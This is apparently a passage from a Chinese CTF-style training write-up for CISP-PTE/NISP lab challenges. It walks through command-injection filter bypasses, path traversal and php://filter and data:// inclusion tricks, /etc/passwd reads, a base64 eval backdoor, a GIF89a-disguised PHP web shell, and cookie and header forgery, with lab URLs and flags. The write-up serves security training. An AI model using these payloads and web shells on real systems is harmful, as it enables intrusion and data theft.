$TEMP = "CISP";
$a = serialize($TEMP);
echo $a;
?>
```
输出结果：
```
s:4:"CISP";
```

![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226104928.png)
### 3.读取flag
```
http://211.103.180.146:34684/vul/index.php?str=s:4:"CISP";
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226105308.png)

```
flag_nisp_e0be4f
```
# 代码审计4
## 思路
```php
<?php  
$v1 = 0;  
$v2 = 0;  
$a = (array)json_decode(@$_GET['w']);  
if (is_array($a)) {    is_numeric(@$a["bar1"]) ? die("nope") : NULL;  
    if (@$a["bar1"]) {  
        ($a["bar1"] > 2020) ? $v1 = 1 : NULL;  
    }  
    if (is_array(@$a["bar2"])) {  
        if (count($a["bar2"]) != 5 or !is_array($a["bar2"][0])) {  
            die("nope");  
        }        
        $pos = array_search("cisp-pte", $a["bar3"]);        
        $pos === false ? die("nope") : NULL;  
        foreach ($a["bar2"] as $key => $val) {            
	        $val == "cisp-pte" ? die("nope") : NULL;  
        }        
        $v2 = 1;  
    }  
}  
if ($v1 && $v2) {  
    include "key.php";  
    echo $key;  
}  
highlight_file(__file__);  
?>

json格式
w={"bar1":"2025a","bar2":[[],"a","b","c","d"],"bar3":["cisp-pte"]}
```
## 解题
### 1.主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226110223.png)
### 2.构建代码
```
json格式
w={"bar1":"2025a","bar2":[[],"a","b","c","d"],"bar3":["cisp-pte"]}
```
### 3.获取flag
直接访问
```
http://211.103.180.146:32556/?w={"bar1":"2025a","bar2":[[],"a","b","c","d"],"bar3":["cisp-pte"]}
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226110319.png)
```
flag_nisp_79aaca
```
# 命令执行1
## 思路
```
直接使用命令：
127.0.0.1|cat ../key.flag
这时候是不显示的，需要绕过一下
加两个单引号即可。
127.0.0.1|ca''t ../key.flag

```
## 解题
### 主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311104728.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311104742.png)

### 拿到flag
```
127.0.0.1|ca''t ../key.flag
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311104812.png)
成功
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311104829.png)
检查源码即可
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311104849.png)
```
flag_nisp_31b34c
```
# 命令执行2
## 思路
```
输入
127.0.0.1|ls /
可以到服务的根目录都有哪些文件

127.0.0.1|cat /flag.php
出了一个敏感词，需要绕过

127.0.0.1|ca''t /flag.php
这样的话就可以了，直接出flag了


```
## 解题
### 主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311105437.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311105446.png)
### flag
```
127.0.0.1|ca''t /flag.php
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311105503.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311105511.png)
```
flag_nisp_02adbb
```
# 命令执行3
## 思路
```
测试
awk "{print}" /flag.php
sh key.php 2>&1
都不行

sed -n 'p' /etc/passwd
发现可以
输入
sed -n 'p' /flag.php
发现，还是不行
这时候就会发现应该是php被禁了。

这时候使用这个：
sed -n 'p' /flag.ph*
就会直接输出。

```
## 解题
### 主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311110237.png)
### flag
```
sed -n 'p' /flag.ph*
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311110254.png)
```
flag_nisp_332005
```
# 命令执行4
## 思路
```
尝试：
127.0.0.1|ls
发现可以 
index.php key.php

输入：
127.0.0.1|c"a"t key.ph*
得到flag地址：
/nisp92234/flag.php
输入
127.0.0.1|c"a"t /nisp92234/flag.ph*
得到
flag
```
## 解题
### 主页面
![](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311111240.png)
### 尝试
```
127.0.0.1|ls
看到一个key.php
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311111328.png)
尝试读取key.php文件
```
127.0.0.1|c"a"t key.ph*

直接绕过cat读取即可，发现成功了，但是并没有什么东西，但是我们查看一下源码即可。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311111423.png)
发现了flag的绝对路径
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311111454.png)
### flag
```
127.0.0.1|c"a"t /nisp92234/flag.ph*
直接进行读取即可。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311111543.png)
```
flag_nisp_1bb8ee
```
# 日志分析1
## 思路
```
找到/adminlogin.php后台地址，这是一个登录页面
然后用burp抓包，账号密码爆破
账号密码是：admin/password123
flag_nisp_d312e0
```
## 解题
### 主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311112432.png)
### 日志
根据日志提示看到很多/adminlogin.php的日志
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311112505.png)
然后我们访问一下，发现是一个登录页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311112551.png)
然后就用burp爆破即可，这里就不演示了。
```
账号密码是：admin/password123
```
登录后就是flag
```
flag_nisp_d312e0
```
# 日志分析2
## 思路
```
这个直接admin目录下有一个backdoor.php的文件里面就是flag
```
## 解题
主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311113030.png)
### flag
直接文件后缀加一个admin即可
```
http://211.103.180.146:35402/admin/
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311113104.png)
backdoor.php就是flag
```
flag_nisp_3d8a44
```
# 文件包含1*
## 思路
```
首先会给一个文件包含的代码：
page参数
直接在url里拼接page即可

这里直接../../../即可。
http://211.103.180.146:33265/?page=../../../../../../../flag.txt
```
## 解题
### 主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311124036.png)
### flag
```
http://211.103.180.146:33265/?page=../../../../flag.txt
```
得出flag
```
flag_nisp_64955a
```
# 文件包含2
## 思路
```



system('cat /flag.php');

c3lzdGVtKCdjYXQgL2ZsYWcucGhwJyk7
```
## 解题
### 主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311125640.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311125656.png)
### flag
```
http://211.103.180.146:34584/vul/fu1.php?file=view.html

这里我们直接看一下这个文件都有什么？
http://211.103.180.146:34584/vul/view.html
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311125734.png)
发现并没有什么东西。还有一堆乱码的文字。然后检查一下源码。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311125830.png)
```
@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10='));

发现了这个使用了base64进行了一次编码处理，我们解一下码看看。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311125912.png)
```
[@eval(base64_decode($_POST[z0]));]

看到这其实是一个后门，还是post传参。
那么我们可以直接构造了。

Hello=123&z0=system('cat /flag.php');

这里的z0参数值需要使用base64编码一下

```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311130105.png)
然后构造
```
Hello=123&z0=c3lzdGVtKCdjYXQgL2ZsYWcucGhwJyk7
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311130154.png)
然后再检查一下源码看看，成功获取到falg
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311130209.png)
```
flag_nisp_a31fe2
```
# 文件包含3
## 思路
```
尝试：
page=file://flag.php
page=../../../../../../../../../../../../../flag.php
php://input
绕过：
page=dadata://ta://text/plain,<?php phpinfo();?>
发现可以执行。

page=dadata://ta://text/plain,<?php system("cat /flag.php")?>
成功获取到了flag。

```
### 解题
### 主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311131632.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311131642.png)
然后进行尝试基础的文件包含的代码
```
page=file://flag.php
page=../../../../../../../../../../../../../flag.php
php://input
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311131722.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311131731.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311131742.png)
发现都不行，后缀后加了txt文件后缀。
但这里可以使用data进行绕过。
```
page=dadata://ta://text/plain,<?php phpinfo();?>
```
发现成功执行了php代码。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311131906.png)

### flag
那么直接构造一个php命令执行。
```
page=dadata://ta://text/plain,<?php system("cat /flag.php")?>
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311131942.png)
```
flag_nisp_34a71d
```
# 文件包含4
## 思路
```
尝试：
file=../../../../../../../key.flag
不行


file=../key.flag
成功GET it!
但没东西
所以使用：
file=php://filter/read=convert.base64-encode/resource=../key.flag

得到base64编码
```

## 解题
### 主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311132717.png)
### flag
```
不解释了，直接抄就行。
file=php://filter/read=convert.base64-encode/resource=../key.flag
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311132747.png)
```
解一下码：
R0VUIGl0IQo8P3BocAovL2ZsYWdfbmlzcF9lN2ZkNWUKPz4K
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311132826.png)

flag
```
flag_nisp_e7fd5e
```
# 文件包含5
```
它给了一个 "http://.../index.php?file="
试一下可不可以
http://211.103.180.146:32756/index.php?file=/etc/passwd
直接读取到了passwd文件。


<?php @eval($_POST[‘pass’]);?>
```
# 文件上传1
```
给了一个php文件，直接上传
```



# 文件上传2

# 文件上传3

# 文件上传4
需要上传phtml文件。
```
GIF89a
<script language='php'>
eval($_POST["cmd"]);
</script>
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311150903.png)

上传后，找到/upload目录，直接访问，获取绝对路径后。
蚁剑直接连就行。
根目录下的这个文件就有flag
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260311150613.png)

# 业务逻辑漏洞1
抓包
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260312103950.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260312104005.png)

```
添加xford头
x-forwarded-for:127.0.0.1
然后修改
Cookie: IsAdmin=true; Username=YWRtaW4%3d

IsAdmin=true  
Username=YWRtaW4%3d    admin
即可获取到flag
```
```
flag_nisp_dc5559
```
